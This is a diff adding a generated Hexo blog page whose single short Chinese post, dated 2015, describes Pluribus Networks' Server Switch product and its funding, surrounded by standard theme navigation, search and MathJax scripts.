+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/01/26/pluribus-networks/" itemprop="url">
+                  Pluribus Networks
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2015-01-27T00:00:00+08:00" content="2015-01-27">
+              2015-01-27
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>已经融资9500万美元的<a href="http://www.pluribusnetworks.com" target="_blank" rel="external">Pluribus</a>公司，做得Server Switch产品，其CEO说，既能克服Vmware产品的scalability, invisibility, performance问题，又能克服Cisco ACI的系统封闭性。说白了就是把网络做在服务器里面，但是网络处理发生在交换芯片而不是CPU里面，跟Facebook Wedge一样 @盛科张卫峰</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+  </section>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/14/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/16/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.gif"
+               alt="Feisky" />
+          <p class="site-author-name" itemprop="name">Feisky</p>
+          <p class="site-description motion-element" itemprop="description">Notes about anything.</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">89</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">14</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">28</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/feiskyer" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/feisky" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/371069890" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.cnblogs.com/feisky/" target="_blank" title="博客园">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  博客园
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Feisky</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+  </script>
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  </script>
+  <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+
+
+  
+
+
+</body>
+</html>
